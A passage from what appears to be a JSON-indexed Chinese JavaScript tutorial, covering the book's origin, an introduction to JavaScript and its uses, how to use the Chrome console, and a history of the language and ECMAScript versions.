笔记。多年累积，数量相当庞大。遇到问题，我首先查自己的笔记，如果笔记里没有，再到网上查，最后回过头把笔记补全。终于有一天，我意识到可以把笔记做成书，这就是这本书的由来。</p>\n<p>正因为脱胎于笔记，这本教程跟其他 JavaScript 书籍有所不同。作为教程，本书对所有重要概念都进行了讲解，努力把复杂的问题讲得简单，希望一两分钟内就能抓住重点。本书还可以作为参考手册，罗列了主要用法和各种 API 接口，并给出可以立即运行的代码。所有章节按照语言的 API 编排，方便以后的查阅。</p>\n<p>如果你发现某处出现陌生的新概念，请不要担心，可以继续阅读下去。以后查阅这些章节的时候，你会发现很方便找到某个知识点相关的所有内容。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"导论","link":"/basic/introduction.html"}],"content":"\n        <h1>\n            <a href='#导论' class='header-anchor'>#</a>\n            <span>导论</span>\n        </h1>\n    \n        <h2>\n            <a href='#什么是-JavaScript-语言？' class='header-anchor'>#</a>\n            <span>什么是 JavaScript 语言？</span>\n        </h2>\n    <p>JavaScript 是一种轻量级的脚本语言。所谓“脚本语言”（script language），指的是它不具备开发操作系统的能力，而是只用来编写控制其他大型应用程序（比如浏览器）的“脚本”。</p>\n<p>JavaScript 也是一种嵌入式（embedded）语言。它本身提供的核心语法不算很多，只能用来做一些数学和逻辑运算。JavaScript 本身不提供任何与 I/O（输入/输出）相关的 API，都要靠宿主环境（host）提供，所以 JavaScript 只合适嵌入更大型的应用程序环境，去调用宿主环境提供的底层 API。</p>\n<p>目前，已经嵌入 JavaScript 的宿主环境有多种，最常见的环境就是浏览器，另外还有服务器环境，也就是 Node 项目。</p>\n<p>从语法角度看，JavaScript 语言是一种“对象模型”语言。各种宿主环境通过这个模型，描述自己的功能和操作接口，从而通过 JavaScript 控制这些功能。但是，JavaScript 并不是纯粹的“面向对象语言”，还支持其他编程范式（比如函数式编程）。这导致几乎任何一个问题，JavaScript 都有多种解决方法。阅读本书的过程中，你会诧异于 JavaScript 语法的灵活性。</p>\n<p>JavaScript 的核心语法部分相当精简，只包括两个部分：基本的语法构造（比如操作符、控制结构、语句）和标准库（就是一系列具有各种功能的对象比如<code>Array</code>、<code>Date</code>、<code>Math</code>等）。除此之外，各种宿主环境提供额外的 API（即只能在该环境使用的接口），以便 JavaScript 调用。以浏览器为例，它提供的额外 API 可以分成三大类。</p>\n<ul>\n<li>浏览器控制类：操作浏览器</li>\n<li>DOM 类：操作网页的各种元素</li>\n<li>Web 类：实现互联网的各种功能</li>\n</ul>\n<p>如果宿主环境是服务器，则会提供各种操作系统的 API，比如文件操作 API、网络通信 API等等。这些你都可以在 Node 环境中找到。</p>\n<p>本书主要介绍 JavaScript 核心语法和浏览器网页开发的基本知识，不涉及 Node。全书可以分成以下四大部分。</p>\n<ul>\n<li>基本语法</li>\n<li>标准库</li>\n<li>浏览器 API</li>\n<li>DOM</li>\n</ul>\n<p>JavaScript 语言有多个版本。本书的内容主要基于 ECMAScript 5.1 版本，这是学习 JavaScript 语法的基础。ES6 和更新的语法请参考我写的<a href=\"http://es6.ruanyifeng.com/\">《ECMAScript 6入门》</a>。</p>\n\n        <h2>\n            <a href='#为什么学习-JavaScript？' class='header-anchor'>#</a>\n            <span>为什么学习 JavaScript？</span>\n        </h2>\n    <p>JavaScript 语言有一些显著特点，使得它非常值得学习。它既适合作为学习编程的入门语言，也适合当作日常开发的工作语言。它是目前最有希望、前途最光明的计算机语言之一。</p>\n\n        <h3>\n            <a href='#操控浏览器的能力' class='header-anchor'>#</a>\n            <span>操控浏览器的能力</span>\n        </h3>\n    <p>JavaScript 的发明目的，就是作为浏览器的内置脚本语言，为网页开发者提供操控浏览器的能力。它是目前唯一一种通用的浏览器脚本语言，所有浏览器都支持。它可以让网页呈现各种特殊效果，为用户提供良好的互动体验。</p>\n<p>目前，全世界几乎所有网页都使用 JavaScript。如果不用，网站的易用性和使用效率将大打折扣，无法成为操作便利、对用户友好的网站。</p>\n<p>对于一个互联网开发者来说，如果你想提供漂亮的网页、令用户满意的上网体验、各种基于浏览器的便捷功能、前后端之间紧密高效的联系，JavaScript 是必不可少的工具。</p>\n\n        <h3>\n            <a href='#广泛的使用领域' class='header-anchor'>#</a>\n            <span>广泛的使用领域</span>\n        </h3>\n    <p>近年来，JavaScript 的使用范围，慢慢超越了浏览器，正在向通用的系统语言发展。</p>\n<p><strong>（1）浏览器的平台化</strong></p>\n<p>随着 HTML5 的出现，浏览器本身的功能越来越强，不再仅仅能浏览网页，而是越来越像一个平台，JavaScript 因此得以调用许多系统功能，比如操作本地文件、操作图片、调用摄像头和麦克风等等。这使得 JavaScript 可以完成许多以前无法想象的事情。</p>\n<p><strong>（2）Node</strong></p>\n<p>Node 项目使得 JavaScript 可以用于开发服务器端的大型项目，网站的前后端都用 JavaScript 开发已经成为了现实。有些嵌入式平台（Raspberry Pi）能够安装 Node，于是 JavaScript 就能为这些平台开发应用程序。</p>\n<p><strong>（3）数据库操作</strong></p>\n<p>JavaScript 甚至也可以用来操作数据库。NoSQL 数据库这个概念，本身就是在 JSON（JavaScript Object Notation）格式的基础上诞生的，大部分 NoSQL 数据库允许 JavaScript 直接操作。基于 SQL 语言的开源数据库 PostgreSQL 支持 JavaScript 作为操作语言，可以部分取代 SQL 查询语言。</p>\n<p><strong>（4）移动平台开发</strong></p>\n<p>JavaScript 也正在成为手机应用的开发语言。一般来说，安卓平台使用 Java 语言开发，iOS 平台使用 Objective-C 或 Swift 语言开发。许多人正在努力，让 JavaScript 成为各个平台的通用开发语言。</p>\n<p>PhoneGap 项目就是将 JavaScript 和 HTML5 打包在一个容器之中，使得它能同时在 iOS 和安卓上运行。Facebook 公司的 React Native 项目则是将 JavaScript 写的组件，编译成原生组件，从而使它们具备优秀的性能。</p>\n<p>Mozilla 基金会的手机操作系统 Firefox OS，更是直接将 JavaScript 作为操作系统的平台语言，但是很可惜这个项目没有成功。</p>\n<p><strong>（5）内嵌脚本语言</strong></p>\n<p>越来越多的应用程序，将 JavaScript 作为内嵌的脚本语言，比如 Adobe 公司的著名 PDF 阅读器 Acrobat、Linux 桌面环境 GNOME 3。</p>\n<p><strong>（6）跨平台的桌面应用程序</strong></p>\n<p>Chromium OS、Windows 8 等操作系统直接支持 JavaScript 编写应用程序。Mozilla 的 Open Web Apps 项目、Google 的 <a href=\"http://developer.chrome.com/apps/about_apps\">Chrome App 项目</a>、Github 的 <a href=\"http://electron.atom.io/\">Electron 项目</a>、以及 <a href=\"http://tidesdk.multipart.net/docs/user-dev/generated/\">TideSDK 项目</a>，都可以用来编写运行于 Windows、Mac OS 和 Android 等多个桌面平台的程序，不依赖浏览器。</p>\n<p><strong>（7）小结</strong></p>\n<p>可以预期，JavaScript 最终将能让你只用一种语言，就开发出适应不同平台（包括桌面端、服务器端、手机端）的程序。早在2013年9月的<a href=\"http://adambard.com/blog/top-github-languages-for-2013-so-far/\">统计</a>之中，JavaScript 就是当年 Github 上使用量排名第一的语言。</p>\n<p>著名程序员 Jeff Atwood 甚至提出了一条 <a href=\"http://www.codinghorror.com/blog/2007/07/the-principle-of-least-power.html\">“Atwood 定律”</a>：</p>\n<blockquote>\n<p>“所有可以用 JavaScript 编写的程序，最终都会出现 JavaScript 的版本。”(Any application that can be written in JavaScript will eventually be written in JavaScript.)</p>\n</blockquote>\n\n        <h3>\n            <a href='#易学性' class='header-anchor'>#</a>\n            <span>易学性</span>\n        </h3>\n    <p>相比学习其他语言，学习 JavaScript 有一些有利条件。</p>\n<p><strong>（1）学习环境无处不在</strong></p>\n<p>只要有浏览器，就能运行 JavaScript 程序；只要有文本编辑器，就能编写 JavaScript 程序。这意味着，几乎所有电脑都原生提供 JavaScript 学习环境，不用另行安装复杂的 IDE（集成开发环境）和编译器。</p>\n<p><strong>（2）简单性</strong></p>\n<p>相比其他脚本语言（比如 Python 或 Ruby），JavaScript 的语法相对简单一些，本身的语法特性并不是特别多。而且，那些语法中的复杂部分，也不是必需要学会。你完全可以只用简单命令，完成大部分的操作。</p>\n<p><strong>（3）与主流语言的相似性</strong></p>\n<p>JavaScript 的语法很类似 C/C++ 和 Java，如果学过这些语言（事实上大多数学校都教），JavaScript 的入门会非常容易。</p>\n<p>必须说明的是，虽然核心语法不难，但是 JavaScript 的复杂性体现在另外两个方面。</p>\n<p>首先，它涉及大量的外部 API。JavaScript 要发挥作用，必须与其他组件配合，这些外部组件五花八门，数量极其庞大，几乎涉及网络应用的各个方面，掌握它们绝非易事。</p>\n<p>其次，JavaScript 语言有一些设计缺陷。某些地方相当不合理，另一些地方则会出现怪异的运行结果。学习 JavaScript，很大一部分时间是用来搞清楚哪些地方有陷阱。Douglas Crockford 写过一本有名的书，名字就叫<a href=\"http://javascript.crockford.com/\">《JavaScript: The Good Parts》</a>，言下之意就是这门语言不好的地方很多，必须写一本书才能讲清楚。另外一些程序员则感到，为了更合理地编写 JavaScript 程序，就不能用 JavaScript 来写，而必须发明新的语言，比如 CoffeeScript、TypeScript、Dart 这些新语言的发明目的，多多少少都有这个因素。</p>\n<p>尽管如此，目前看来，JavaScript 的地位还是无法动摇。加之，语言标准的快速进化，使得 JavaScript 功能日益增强，而语法缺陷和怪异之处得到了弥补。所以，JavaScript 还是值得学习，况且它的入门真的不难。</p>\n\n        <h3>\n            <a href='#强大的性能' class='header-anchor'>#</a>\n            <span>强大的性能</span>\n        </h3>\n    <p>JavaScript 的性能优势体现在以下方面。</p>\n<p><strong>（1）灵活的语法，表达力强。</strong></p>\n<p>JavaScript 既支持类似 C 语言清晰的过程式编程，也支持灵活的函数式编程，可以用来写并发处理（concurrent）。这些语法特性已经被证明非常强大，可以用于许多场合，尤其适用异步编程。</p>\n<p>JavaScript 的所有值都是对象，这为程序员提供了灵活性和便利性。因为你可以很方便地、按照需要随时创造数据结构，不用进行麻烦的预定义。</p>\n<p>JavaScript 的标准还在快速进化中，并不断合理化，添加更适用的语法特性。</p>\n<p><strong>（2）支持编译运行。</strong></p>\n<p>JavaScript 语言本身，虽然是一种解释型语言，但是在现代浏览器中，JavaScript 都是编译后运行。程序会被高度优化，运行效率接近二进制程序。而且，JavaScript 引擎正在快速发展，性能将越来越好。</p>\n<p>此外，还有一种 WebAssembly 格式，它是 JavaScript 引擎的中间码格式，全部都是二进制代码。由于跳过了编译步骤，可以达到接近原生二进制代码的运行速度。各种语言（主要是 C 和 C++）通过编译成 WebAssembly，就可以在浏览器里面运行。</p>\n<p><strong>（3）事件驱动和非阻塞式设计。</strong></p>\n<p>JavaScript 程序可以采用事件驱动（event-driven）和非阻塞式（non-blocking）设计，在服务器端适合高并发环境，普通的硬件就可以承受很大的访问量。</p>\n\n        <h3>\n            <a href='#开放性' class='header-anchor'>#</a>\n            <span>开放性</span>\n        </h3>\n    <p>JavaScript 是一种开放的语言。它的标准 ECMA-262 是 ISO 国际标准，写得非常详尽明确；该标准的主要实现（比如 V8 和 SpiderMonkey 引擎）都是开放的，而且质量很高。这保证了这门语言不属于任何公司或个人，不存在版权和专利的问题。</p>\n<p>语言标准由 TC39 委员会负责制定，该委员会的运作是透明的，所有讨论都是开放的，会议记录都会对外公布。</p>\n<p>不同公司的 JavaScript 运行环境，兼容性很好，程序不做调整或只做很小的调整，就能在所有浏览器上运行。</p>\n\n        <h3>\n            <a href='#社区支持和就业机会' class='header-anchor'>#</a>\n            <span>社区支持和就业机会</span>\n        </h3>\n    <p>全世界程序员都在使用 JavaScript，它有着极大的社区、广泛的文献和图书、丰富的代码资源。绝大部分你需要用到的功能，都有多个开源函数库可供选用。</p>\n<p>作为项目负责人，你不难招聘到数量众多的 JavaScript 程序员；作为开发者，你也不难找到一份 JavaScript 的工作。</p>\n\n        <h2>\n            <a href='#实验环境' class='header-anchor'>#</a>\n            <span>实验环境</span>\n        </h2>\n    <p>本教程包含大量的示例代码，只要电脑安装了浏览器，就可以用来实验了。读者可以一边读一边运行示例，加深理解。</p>\n<p>推荐安装 Chrome 浏览器，它的“开发者工具”（Developer Tools）里面的“控制台”（console），就是运行 JavaScript 代码的理想环境。</p>\n<p>进入 Chrome 浏览器的“控制台”，有两种方法。</p>\n<ul>\n<li>直接进入：按下<code>Option + Command + J</code>（Mac）或者<code>Ctrl + Shift + J</code>（Windows / Linux）</li>\n<li>开发者工具进入：开发者工具的快捷键是 F12，或者<code>Option + Command + I</code>（Mac）以及<code>Ctrl + Shift + I</code>（Windows / Linux），然后选择 Console 面板</li>\n</ul>\n<p>进入控制台以后，就可以在提示符后输入代码，然后按<code>Enter</code>键，代码就会执行。如果按<code>Shift + Enter</code>键，就是代码换行，不会触发执行。建议阅读本教程时，将代码复制到控制台进行实验。</p>\n<p>作为尝试，你可以将下面的程序复制到“控制台”，按下回车后，就可以看到运行结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>function greetMe(yourName) {\n  console.log(&#039;Hello &#039; + yourName);\n}\n\ngreetMe(&#039;World&#039;)\n// Hello World</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"历史","link":"/basic/history.html"}],"content":"\n        <h1>\n            <a href='#JavaScript-语言的历史' class='header-anchor'>#</a>\n            <span>JavaScript 语言的历史</span>\n        </h1>\n    \n        <h2>\n            <a href='#诞生' class='header-anchor'>#</a>\n            <span>诞生</span>\n        </h2>\n    <p>JavaScript 因为互联网而生，紧跟着浏览器的出现而问世。回顾它的历史，就要从浏览器的历史讲起。</p>\n<p>1990年底，欧洲核能研究组织（CERN）科学家 Tim Berners-Lee，在全世界最大的电脑网络——互联网的基础上，发明了万维网（World Wide Web），从此可以在网上浏览网页文件。最早的网页只能在操作系统的终端里浏览，也就是说只能使用命令行操作，网页都是在字符窗口中显示，这当然非常不方便。</p>\n<p>1992年底，美国国家超级电脑应用中心（NCSA）开始开发一个独立的浏览器，叫做 Mosaic。这是人类历史上第一个浏览器，从此网页可以在图形界面的窗口浏览。</p>\n<p>1994年10月，NCSA 的一个主要程序员 Marc Andreessen 联合风险投资家 Jim Clark，成立了 Mosaic 通信公司（Mosaic Communications），不久后改名为 Netscape。这家公司的方向，就是在 Mosaic 的基础上，开发面向普通用户的新一代的浏览器 Netscape Navigator。</p>\n<p>1994年12月，Navigator 发布了1.0版，市场份额一举超过90%。</p>\n<p>Netscape 公司很快发现，Navigator 浏览器需要一种可以嵌入网页的脚本语言，用来控制浏览器行为。当时，网速很慢而且上网费很贵，有些操作不宜在服务器端完成。比如，如果用户忘记填写“用户名”，就点了“发送”按钮，到服务器再发现这一点就有点太晚了，最好能在用户发出数据之前，就告诉用户“请填写用户名”。这就需要在网页中嵌入小程序，让浏览器检查每一栏是否都填写了。</p>\n<p>管理层对这种浏览器脚本语言的设想是：功能不需要太强，语法较为简单，容易学习和部署。那一年，正逢 Sun 公司的 Java 语言问世，市场推广活动非常成功。Netscape 公司决定与 Sun 公司合作，浏览器支持嵌入 Java 小程序（后来称为 Java applet）。但是，浏览器脚本语言是否就选用 Java，则存在争论。后来，还是决定不使用 Java，因为网页小程序不需要 Java 这么“重”的语法。但是，同时也决定脚本语言的语法要接近 Java，并且可以支持 Java 程序。这些设想直接排除了使用现存语言，比如 Perl、Python 和 TCL。</p>\n<p>1995年，Netscape 公司雇佣了程序员 Brendan Eich 开发这种网页脚本语言。Brendan Eich 有很强的函数式编程背景，希望以 Scheme 语言（函数式语言鼻祖 LISP 语言的一种方言）为蓝本，实现这种新语言。</p>\n<p>1995年5月，Brendan Eich 只用了10天，就设计完成了这种语言的第一版。它是一个大杂烩，语法有多个来源。</p>\n<ul>\n<li>基本语法：借鉴 C 语言和 Java 语言。</li>\n<li>数据结构：借鉴 Java 语言，包括将值分成原始值和对象两大类。</li>\n<li>函数的用法：借鉴 Scheme 语言和 Awk 语言，将函数当作第一等公民，并引入闭包。</li>\n<li>原型继承模型：借鉴 Self 语言（Smalltalk 的一种变种）。</li>\n<li>正则表达式：借鉴 Perl 语言。</li>\n<li>字符串和数组处理：借鉴 Python 语言。</li>\n</ul>\n<p>为了保持简单，这种脚本语言缺少一些关键的功能，比如块级作用域、模块、子类型（subtyping）等等，但是可以利用现有功能找出解决办法。这种功能的不足，直接导致了后来 JavaScript 的一个显著特点：对于其他语言，你需要学习语言的各种功能，而对于 JavaScript，你常常需要学习各种解决问题的模式。而且由于来源多样，从一开始就注定，JavaScript 的编程风格是函数式编程和面向对象编程的一种混合体。</p>\n<p>Netscape 公司的这种浏览器脚本语言，最初名字叫做 Mocha，1995年9月改为 LiveScript。12月，Netscape 公司与 Sun 公司（Java 语言的发明者和所有者）达成协议，后者允许将这种语言叫做 JavaScript。这样一来，Netscape 公司可以借助 Java 语言的声势，而 Sun 公司则将自己的影响力扩展到了浏览器。</p>\n<p>之所以起这个名字，并不是因为 JavaScript 本身与 Java 语言有多么深的关系（事实上，两者关系并不深，详见下节），而是因为 Netscape 公司已经决定，使用 Java 语言开发网络应用程序，JavaScript 可以像胶水一样，将各个部分连接起来。当然，后来的历史是 Java 语言的浏览器插件失败了，JavaScript 反而发扬光大。</p>\n<p>1995年12月4日，Netscape 公司与 Sun 公司联合发布了 JavaScript 语言，对外宣传 JavaScript 是 Java 的补充，属于轻量级的 Java，专门用来操作网页。</p>\n<p>1996年3月，Navigator 2.0 浏览器正式内置了 JavaScript 脚本语言。</p>\n\n        <h2>\n            <a href='#JavaScript-与-Java-的关系' class='header-anchor'>#</a>\n            <span>JavaScript 与 Java 的关系</span>\n        </h2>\n    <p>这里专门说一下 JavaScript 和 Java 的关系。它们是两种不一样的语言，但是彼此存在联系。</p>\n<p>JavaScript 的基本语法和对象体系，是模仿 Java 而设计的。但是，JavaScript 没有采用 Java 的静态类型。正是因为 JavaScript 与 Java 有很大的相似性，所以这门语言才从一开始的 LiveScript 改名为 JavaScript。基本上，JavaScript 这个名字的原意是“很像Java的脚本语言”。</p>\n<p>JavaScript 语言的函数是一种独立的数据类型，以及采用基于原型对象（prototype）的继承链。这是它与 Java 语法最大的两点区别。JavaScript 语法要比 Java 自由得多。</p>\n<p>另外，Java 语言需要编译，而 JavaScript 语言则是运行时由解释器直接执行。</p>\n<p>总之，JavaScript 的原始设计目标是一种小型的、简单的动态语言，与 Java 有足够的相似性，使得使用者（尤其是 Java 程序员）可以快速上手。</p>\n\n        <h2>\n            <a href='#JavaScript-与-ECMAScript-的关系' class='header-anchor'>#</a>\n            <span>JavaScript 与 ECMAScript 的关系</span>\n        </h2>\n    <p>1996年8月，微软模仿 JavaScript 开发了一种相近的语言，取名为JScript（JavaScript是Netscape的注册商标，微软不能用），首先内置于IE 3.0。Netscape 公司面临丧失浏览器脚本语言的主导权的局面。</p>\n<p>1996年11月，Netscape 公司决定将 JavaScript 提交给国际标准化组织 ECMA（European Computer Manufacturers Association），希望 JavaScript 能够成为国际标准，以此抵抗微软。ECMA 的39号技术委员会（Technical Committee 39）负责制定和审核这个标准，成员由业内的大公司派出的工程师组成，目前共25个人。该委员会定期开会，所有的邮件讨论和会议记录，都是公开的。</p>\n<p>1997年7月，ECMA 组织发布262号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript。这个版本就是 ECMAScript 1.0 版。之所以不叫 JavaScript，一方面是由于商标的关系，Java 是 Sun 公司的商标，根据一份授权协议，只有 Netscape 公司可以合法地使用 JavaScript 这个名字，且 JavaScript 已经被 Netscape 公司注册为商标，另一方面也是想体现这门语言的制定者是 ECMA，不是 Netscape，这样有利于保证这门语言的开放性和中立性。因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现。在日常场合，这两个词是可以互换的。</p>\n<p>ECMAScript 只用来标准化 JavaScript 这种语言的基本语法结构，与部署环境相关的标准都由其他标准规定，比如 DOM 的标准就是由 W3C组织（World Wide Web Consortium）制定的。</p>\n<p>ECMA-262 标准后来也被另一个国际标准化组织 ISO（International Organization for Standardization）批准，标准号是 ISO-16262。</p>\n\n        <h2>\n            <a href='#JavaScript的版本' class='header-anchor'>#</a>\n            <span>JavaScript的版本</span>\n        </h2>\n    <p>1997年7月，ECMAScript 1.0发布。</p>\n<p>1998年6月，ECMAScript 2.0版发布。</p>\n<p>1999年12月，ECMAScript 3.0版发布，成为 JavaScript 的通行标准，得到了广泛支持。</p>\n<p>2007年10月，ECMAScript 4.0版草案发布，对3.0版做了大幅升级，预计次年8月发布正式版本。草案发布后，由于4.0版的目标过于激进，各方对于是否通过这个标准，发生了严重分歧。以 Yahoo、Microsoft、Google 为首的大公司，反对 JavaScript 的大幅升级，主张小幅改动；以 JavaScript 创造者 Brendan Eich 为首的 Mozilla 公司，则坚持当前的草案。</p>\n<p>2008年7月，由于对于下一个版本应该包括哪些功能，各方分歧太大，争论过于激进，ECMA 开会决定，中止 ECMAScript 4.0 的开发（即废除了这个版本），将其中涉及现有功能改善的一小部分，发布为 ECMAScript 3.1，而将其他激进的设想扩大范围，放入以后的版本，由于会议的气氛，该版本的项目代号起名为 Harmony（和谐）。会后不久，ECMAScript 3.1 就改名为 ECMAScript 5。</p>\n<p>2009年12月，ECMAScript 5.0版 正式发布。Harmony 项目则一分为二，一些较为可行的设想定名为 JavaScript.next 继续开发，后来演变成 ECMAScript 6；一些不是很成熟的设想，则被视为 JavaScript.next.next，在更远的将来再考虑推出。TC39 的总体考虑是，ECMAScript 5 与 ECMAScript 3 基本保持兼容，较大的语法修正和新功能加入，将由 JavaScript.next 完成。当时，JavaScript.next 指的是ECMAScript 6。第六版发布以后，将指 ECMAScript 7。TC39 预计，ECMAScript 5 会在2013年的年中成为 JavaScript 开发的主流标准，并在此后五年中一直保持这个位置。</p>\n<p>2011年6月，ECMAscript 5.1版发布，并且成为 ISO 国际标准（ISO/IEC 16262:2011）。到了2012年底，所有主要浏览器都支持 ECMAScript 5.1版的全部功能。</p>\n<p>2013年3月，ECMAScript 6 草案冻结，不再添加新功能。新的功能设想将被放到 ECMAScript 7。</p>\n<p>2013年12月，ECMAScript 6 草案发布。然后是12个月的讨论期，听取各方反馈。</p>\n<p>2015年6月，ECMAScript 6 正式发布，并且更名为“ECMAScript 2015”。这是因为 TC39 委员会计划，以后每年发布一个 ECMAScript 的版本，下一个版本在2016年发布，称为”ECMAScript 2016”，2017年发布“ECMAScript 2017”，以此类推。</p>\n\n        <h2>\n            <a href='#周边大事记' class='header-anchor'>#</a>\n            <span>周边大事记</span>\n        </h2>\n    <p>JavaScript 伴随着互联网的发展一起发展。互联网周边技术的快速发展，刺激和推动了 JavaScript 语言的发展。下面，回顾一下 JavaScript 的周边应用发展。</p>\n<p>1996年，样式表标准 CSS 第一版发布。</p>\n<p>1997年，DHTML（Dynamic HTML，动态 HTML）发布，允许动态改变网页内容。这标志着 DOM 模式（Document Object Model，文档对象模型）正式应用。</p>\n<p>1998年，Netscape 公司开源了浏览器，这导致了 Mozilla 项目的诞生。几个月后，美国在线（AOL）宣布并购 Netscape。</p>\n<p>1999年，IE 5部署了 XMLHttpRequest 接口，允许 JavaScript 发出 HTTP 请求，为后来大行其道的 Ajax 应用创造了条件。</p>\n<p>2000年，KDE 项目重写了浏览器引擎 KHTML，为后来的 WebKit 和 Blink 引擎打下基础。这一年的10月23日，KDE 2.0发布，第一次将 KHTML 浏览器包括其中。</p>\n<p>2001年，微软公司时隔5年之后，发布了 IE 浏览器的下一个版本 Internet Explorer 6。这是当时最先进的浏览器，它后来统治了浏览器市场多年。</p>\n<p>2001年，Douglas Crockford 提出了 JSON 格式，用于取代 XML 格式，进行服务器和网页之间的数据交换。JavaScript 可以原生支持这种格式，不需要额外部署代码。</p>\n<p>2002年，Mozilla 项目发布了它的浏览器的第一版，后来起名为 Firefox。</p>\n<p>2003年，苹果公司发布了 Safari 浏览器的第一版。</p>\n<p>2004年，Google 公司发布了 Gmail，促成了互联网应用程序（Web Application）这个概念的诞生。由于 Gmail 是在4月1日发布的，很多人起初以为这只是一个玩笑。</p>\n<p>2004年，Dojo 框架诞生，为不同浏览器提供了同一接口，并为主要功能提供了便利的调用方法。这标志着 JavaScript 编程框架的时代开始来临。</p>\n<p>2004年，WHATWG 组织成立，致力于加速 HTML 语言的标准化进程。</p>\n<p>2005年，苹果公司在 KHTML 引擎基础上，建立了 WebKit 引擎。</p>\n<p>2005年，Ajax 方法（Asynchronous JavaScript and XML）正式诞生，Jesse James Garrett 发明了这个词汇。它开始流行的标志是，2月份发布的 Google Maps 项目大量采用该方法。它几乎成了新一代网站的标准做法，促成了 Web 2.0时代的来临。</p>\n<p>2005年，Apache 基金会发布了 CouchDB 数据库。这是一个基于 JSON 格式的数据库，可以用 JavaScript 函数定义视图和索引。它在本质上有别于传统的关系型数据库，标识着 NoSQL 类型的数据库诞生。</p>\n<p>2006年，jQuery 函数库诞生，作者为John Resig。jQuery 为操作网页 DOM 结构提供了非常强大易用的接口，成为了使用最广泛的函数库，并且让 JavaScript 语言的应用难度大大降低，推动了这种语言的流行。</p>\n<p>2006年，微软公司发布 IE 7，标志重新开始启动浏览器的开发。</p>\n<p>2006年，Google推出 Google Web Toolkit 项目（缩写为 GWT），提供 Java 编译成 JavaScript 的功能，开创了将其他语言转为 JavaScript 的先河。</p>\n<p>2007年，Webkit 引擎在 iPhone 手机中得到部署。它最初基于 KDE 项目，2003年苹果公司首先采用，2005年开源。这标志着 JavaScript 语言开始能在手机中使用了，意味着有可能写出在桌面电脑和手机中都能使用的程序。</p>\n<p>2007年，Douglas Crockford 发表了名为《JavaScript: The good parts》的演讲，次年由 O&#39;Reilly 出版社出版。这标志着软件行业开始严肃对待 JavaScript 语言，对它的语法开始重新认识，</p>\n<p>2008年，V8 编译器诞生。这是 Google 公司为 Chrome 浏览器而开发的，它的特点是让 JavaScript 的运行变得非常快。它提高了 JavaScript 的性能，推动了语法的改进和标准化，改变外界对 JavaScript 的不佳印象。同时，V8 是开源的，任何人想要一种快速的嵌入式脚本语言，都可以采用 V8，这拓展了 JavaScript 的应用领域。</p>\n<p>2009年，Node.js 项目诞生，创始人为 Ryan Dahl，它标志着 JavaScript 可以用于服务器端编程，从此网站的前端和后端可以使用同一种语言开发。并且，Node.js 可以承受很大的并发流量，使得开发某些互联网大规模的实时应用变得容易。</p>\n<p>2009年，Jeremy Ashkenas 发布了 CoffeeScript 的最初版本。CoffeeScript 可以被转换为 JavaScript 运行，但是语法要比 JavaScript简洁。这开启了其他语言转为 JavaScript 的风潮。</p>\n<p>2009年，PhoneGap 项目诞生，它将 HTML5 和 JavaScript 引入移动设备的应用程序开发，主要针对 iOS 和 Android 平台，使得 JavaScript 可以用于跨平台的应用程序开发。</p>\n<p>2009，Google 发布 Chrome OS，号称是以浏览器为基础发展成的操作系统，允许直接使用 JavaScript 编写应用程序。类似的项目还有 Mozilla 的 Firefox OS。</p>\n<p>2010年，三个重要的项目诞生，分别是 NPM、BackboneJS 和 RequireJS，标志着 JavaScript 进入模块化开发的时代。</p>\n<p>2011年，微软公司发布 Windows 8操作系统，将 JavaScript 作为应用程序的开发语言之一，直接提供系统支持。</p>\n<p>2011年，Google 发布了 Dart 语言，目的是为了结束 JavaScript 语言在浏览器中的垄断，提供更合理、更强大的语法和功能。Chromium浏览器有内置的 Dart 虚拟机，可以运行 Dart 程序，但 Dart 程序也可以被编译成 JavaScript 程序运行。</p>\n<p>2011年，微软工程师<a href=\"http://www.hanselman.com/blog/JavaScriptIsAssemblyLanguageForTheWebSematicMarkupIsDeadCleanVsMachinecodedHTML.aspx\">Scott Hanselman</a>提出，JavaScript 将是互联网的汇编语言。因为它无所不在，而且正在变得越来越快。其他语言的程序可以被转成 JavaScript 语言，然后在浏览器中运行。</p>\n<p>2012年，单页面应用程序框架（single-page app framework）开始崛起，AngularJS 项目和 Ember 项目都发布了1.0版本。</p>\n<p>2012年，微软发布 TypeScript 语言。该语言被设计成 JavaScript 的超集，这意味着所有 JavaScript 程序，都可以不经修改地在 TypeScript 中运行。同时，TypeScript 添加了很多新的语法特性，主要目的是为了开发大型程序，然后还可以被编译成 JavaScript 运行。</p>\n<p>2012年，Mozilla 基金会提出 <a href=\"http://asmjs.org/\">asm.js</a> 规格。asm.js 是 JavaScript 的一个子集，所有符合 asm.js 的程序都可以在浏览器中运行，它的特殊之处在于语法有严格限定，可以被快速编译成性能良好的机器码。这样做的目的，是为了给其他语言提供一个编译规范，使其可以被编译成高效的 JavaScript 代码。同时，Mozilla 基金会还发起了 <a href=\"https://github.com/kripken/emscripten/wiki\">Emscripten</a> 项目，目标就是提供一个跨语言的编译器，能够将 LLVM 的位代码（bitcode）转为 JavaScript 代码，在浏览器中运行。因为大部分 LLVM 位代码都是从 C / C++ 语言生成的，这意味着 C / C++ 将可以在浏览器中运行。此外，Mozilla 旗下还有 <a href=\"http://mbebenita.github.io/LLJS/\">LLJS</a> （将 JavaScript 转为 C 代码）项目和 <a href=\"https://github.com/RiverTrail/RiverTrail/wiki\">River Trail</a> （一个用于多核心处理器的 ECMAScript 扩展）项目。目前，可以被编译成 JavaScript 的<a href=\"https://github.com/jashkenas/coffee-script/wiki/List-of-languages-that-compile-to-JS\">语言列表</a>，共有将近40种语言。</p>\n<p>2013年，Mozilla 基金会发布手机操作系统 Firefox OS，该操作系统的整个用户界面都使用 JavaScript。</p>\n<p>2013年，ECMA 正式推出 JSON 的<a href=\"http://www.ecma-international.org/publications/standards/Ecma-404.htm\">国际标准</a>，这意味着 JSON 格式已经变得与 XML 格式一样重要和正式了。</p>\n<p>2013年5月，Facebook 发布 UI 框架库 React，引入了新的 JSX 语法，使得 UI 层可以用组件开发，同时引入了网页应用是状态机的概念。</p>\n<p>2014年，微软推出 JavaScript 的 Windows 库 WinJS，标志微软公司全面支持 JavaScript 与 Windows 操作系统的融合。</p>\n<p>2014年11月，由于对 Joyent 公司垄断 Node 